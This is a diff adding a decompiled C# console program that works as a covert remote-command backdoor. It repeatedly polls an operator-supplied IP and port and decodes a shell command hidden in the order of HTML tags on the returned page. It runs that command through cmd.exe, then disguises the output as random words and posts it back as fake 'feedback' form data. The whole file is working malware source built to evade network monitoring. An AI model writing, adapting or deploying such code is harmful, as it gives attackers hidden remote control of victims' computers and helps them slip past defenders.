@@ -1,0 +1,149 @@
+// MyProject, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
+// MyNamespace.Program
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Net.Http;
+using System.Text;
+using System.Text.RegularExpressions;
+using System.Threading.Tasks;
+
+internal class Program
+{
+	private static Dictionary<string, string> tagHex = new Dictionary<string, string>
+	{
+		{ "cite", "0" },
+		{ "h1", "1" },
+		{ "p", "2" },
+		{ "a", "3" },
+		{ "img", "4" },
+		{ "ul", "5" },
+		{ "ol", "6" },
+		{ "button", "7" },
+		{ "div", "8" },
+		{ "span", "9" },
+		{ "label", "a" },
+		{ "textarea", "b" },
+		{ "nav", "c" },
+		{ "b", "d" },
+		{ "i", "e" },
+		{ "blockquote", "f" }
+	};
+
+	private static async Task Main(string[] args)
+	{
+		if (args.Length < 2)
+		{
+			Console.WriteLine("Usage: program.exe <IPAddress> <Port>");
+			return;
+		}
+		string value = args[0];
+		string value2 = args[1];
+		string url = $"http://{value}:{value2}/";
+		byte[] bytes = Convert.FromBase64String("YXBwbGUKYWlycGxhbmUKYW50CmF2b2NhZG8KYXJyb3cKYXN0cm9uYXV0CmFsYXJtCmFuY2hvcgphY3JvYmF0CmFsYnVtCmJhbmFuYQpiYWxsCmJvb2sKYnV0dGVyZmx5CmJpcmQKYmVhY2gKYmFza2V0CmJpY3ljbGUKYm90dGxlCmJlYXIKY2F0CmNhcgpjYWtlCmNsb3VkCmNhbmRsZQpjb21wdXRlcgpjb29raWUKY2FtZXJhCmNsb3duCmNhc3RsZQpkb2cKZHVjawpkb29yCmRyYWdvbgpkb2xwaGluCmRpYW1vbmQKZHJ1bQpkZXNrCmRvbGwKZGlub3NhdXIKZWxlcGhhbnQKZWdnCmVhZ2xlCmVhcnRoCmVudmVsb3BlCmVuZ2luZQplbGYKZXJhc2VyCmVzY2FsYXRvcgplYXNlbApmaXNoCmZsb3dlcgpmcm9nCmZpcmUKZm94CmZsYWcKZnJ1aXQKZmVhdGhlcgpmZW5jZQpmbGFzaGxpZ2h0CmdyYXBlCmd1aXRhcgpnbG9iZQpnYW1lCmdvYXQKZ2hvc3QKZ2xhc3NlcwpnYXJkZW4KZ2VtCmdpZnQKaG91c2UKaGF0CmhlYXJ0CmhvcnNlCmhhbW1lcgpoZWxpY29wdGVyCmhvbmV5CmhhbWJ1cmdlcgpob3JuCmhlZGdlaG9nCmljZS1jcmVhbQppZ2xvbwppc2xhbmQKaW5rCmluc2VjdAppcm9uCmljZQppZ3VhbmEKaW52aXRhdGlvbgppbnN0cnVtZW50CmphY2tldApqZWxseWZpc2gKamFyCmp1bmdsZQpqdWljZQpqaWdzYXcKanVtcApqZXdlbApqZXQKamFjay1vLWxhbnRlcm4Ka2FuZ2Fyb28Ka2l0ZQprZXkKa2luZwprb2FsYQprYXlhawprZXR0bGUKa2l0Y2hlbgprZXlib2FyZAprbmlnaHQKbGVtb24KbGlvbgpsYWRkZXIKbGFtcApsZWFmCmxpZ2h0aG91c2UKbG9nCmxhcHRvcApsb2NrCmxhZHlidWcKbWFuZ28KbW9ua2V5Cm1vb24KbW91bnRhaW4KbXVzaHJvb20KbW91c2UKbWFpbGJveAptYWduZXQKbWljcm9waG9uZQptYXNrCm5vdGVib29rCm5lc3QKbmFpbApuZXQKbm9zZQpudXQKbmluamEKbmVja2xhY2UKbmV3c3BhcGVyCm5vb2RsZXMKb3JhbmdlCm93bApvY2VhbgpvY3RvcHVzCm9uaW9uCm92ZW4Kb3lzdGVyCm90dGVyCm9saXZlCm9ybmFtZW50CnBpbmVhcHBsZQpwZWFyCnBpenphCnB1bXBraW4KcGVuZ3VpbgpwZW5jaWwKcGxhbmUKcHlyYW1pZApwYW5kYQpwb3Bjb3JuCnF1ZWVuCnF1aWx0CnF1ZXN0aW9uCnF1aWxsCnF1YWlsCnF1aXZlcgpxdWFydHoKcXVldWUKcXVhcnRlcmJhY2sKcXVhZHJpbGF0ZXJhbApyYWJiaXQKcmFpbmJvdwpyb2JvdApyb2NrZXQKcmluZwpyYWNjb29uCnJ1bGVyCnJvc2UKcmFkaW8KcnVnCnN0YXIKc3VuCnNuYWtlCnNvY2sKc3Bvb24Kc3F1aXJyZWwKc2hpcApzbm93bWFuCnNwaWRlcgpzYW5kd2ljaAp0YWJsZQp0cmVlCnRpZ2VyCnR1cnRsZQp0cmFpbgp0ZWxlc2NvcGUKdG9vdGgKdHJ1bXBldAp0b21hdG8KdGFtYm91cmluZQp1bWJyZWxsYQp1bmljb3JuCnVuaWZvcm0KdXRlbnNpbAp1bml2ZXJzZQp1bmljeWNsZQp1a3VsZWxlCnVuZGVyZ3JvdW5kCnVybgp1cGhvbHN0ZXJlcgp2aW9saW4Kdm9sY2Fubwp2YW4KdmVzdAp2ZWdldGFibGUKdmluZQp2YWN1dW0KdmFzZQp2dWx0dXJlCnZpZGVvCndhdGVybWVsb24Kd2hhbGUKd29ybQp3YWdvbgp3YW5kCndpbmRtaWxsCndhdGNoCndpbmcKd2FsbGV0CndoZWVsCnh5bG9waG9uZQp4LXJheQp4ZWJlYwp4eWxpdG9sCnhlbm9uCnhhbnRoYW4KeGVyb3Npcwp4ZXJvcGh5dGUKeHlsdWxvc2UKeG1hcwp5ZWxsb3cKeWFjaHQKeW9ndXJ0CnlvbGsKeWFrCnlhd24KeXVjY2EKeW9kZWwKeXVydAp5ZXcKemVicmEKemlwcGVyCnpvbwp6aWd6YWcKemVybwp6b21iaWUKemFwCnplbGRhCnpvbmUKemVu");
+		string text = Encoding.UTF8.GetString(bytes).Trim();
+		string[] separator = new string[3] { "\r\n", "\n", "\r" };
+		string[] array = text.Split(separator, StringSplitOptions.RemoveEmptyEntries);
+		Dictionary<string, List<string>> wordsDict = new Dictionary<string, List<string>>();
+		string[] array2 = array;
+		foreach (string text2 in array2)
+		{
+			char c = text2[0];
+			if (wordsDict.ContainsKey(c.ToString()))
+			{
+				wordsDict[c.ToString()].Add(text2.Substring(1));
+				continue;
+			}
+			wordsDict[c.ToString()] = new List<string> { text2.Substring(1) };
+		}
+		while (true)
+		{
+			await SendRequest();
+		}
+		static string DecodeData(string data)
+		{
+			StringBuilder stringBuilder = new StringBuilder();
+			string[] array3 = new Regex("<body>(.*?)</body>", RegexOptions.Singleline).Match(data).Groups[1].Value.Split(new string[1] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
+			foreach (Match item in new Regex("<(\\w+)[\\s>]", RegexOptions.Singleline).Matches(array3[0]))
+			{
+				if (item.Success)
+				{
+					GroupCollection groups = item.Groups;
+					if (groups[1].Value != "li")
+					{
+						stringBuilder.Append(tagHex[groups[1].Value]);
+					}
+				}
+			}
+			return HexStringToBytes(stringBuilder.ToString());
+		}
+		string EncodeData(string data)
+		{
+			string text3 = Convert.ToBase64String(Encoding.UTF8.GetBytes(data));
+			StringBuilder stringBuilder = new StringBuilder();
+			Random random = new Random();
+			string text4 = text3;
+			for (int j = 0; j < text4.Length; j++)
+			{
+				char value3 = text4[j];
+				if (wordsDict.ContainsKey(value3.ToString().ToLower()))
+				{
+					string value4 = wordsDict[value3.ToString().ToLower()][random.Next(0, 10)];
+					stringBuilder.Append(value3);
+					stringBuilder.Append(value4);
+					stringBuilder.Append(" ");
+				}
+				else
+				{
+					stringBuilder.Append(value3);
+					stringBuilder.Append(" ");
+				}
+			}
+			return stringBuilder.ToString();
+		}
+		static string HexStringToBytes(string hex)
+		{
+			byte[] array3 = new byte[hex.Length / 2];
+			for (int j = 0; j < hex.Length; j += 2)
+			{
+				array3[j / 2] = Convert.ToByte(hex.Substring(j, 2), 16);
+			}
+			return Encoding.ASCII.GetString(array3);
+		}
+		async Task SendRequest()
+		{
+			_ = 2;
+			try
+			{
+				using HttpClient client = new HttpClient();
+				client.Timeout = TimeSpan.FromSeconds(180.0);
+				HttpResponseMessage obj = await client.GetAsync(url);
+				obj.EnsureSuccessStatusCode();
+				string text3 = DecodeData(await obj.Content.ReadAsStringAsync());
+				using Process process = new Process();
+				process.StartInfo.FileName = "cmd.exe";
+				process.StartInfo.Arguments = "/c " + text3;
+				process.StartInfo.RedirectStandardOutput = true;
+				process.StartInfo.UseShellExecute = false;
+				process.Start();
+				process.WaitForExit();
+				string text4 = process.StandardOutput.ReadToEnd();
+				if (text4 == "")
+				{
+					text4 = "succeed";
+				}
+				text4 = EncodeData(text4);
+				FormUrlEncodedContent content = new FormUrlEncodedContent(new KeyValuePair<string, string>[2]
+				{
+					new KeyValuePair<string, string>("Name", "Test User"),
+					new KeyValuePair<string, string>("feedback", text4)
+				});
+				(await client.PostAsync(url + "submit_feedback", content)).EnsureSuccessStatusCode();
+			}
+			catch (Exception ex)
+			{
+				Console.WriteLine("Error: " + ex.Message);
+			}
+		}
+	}
+}
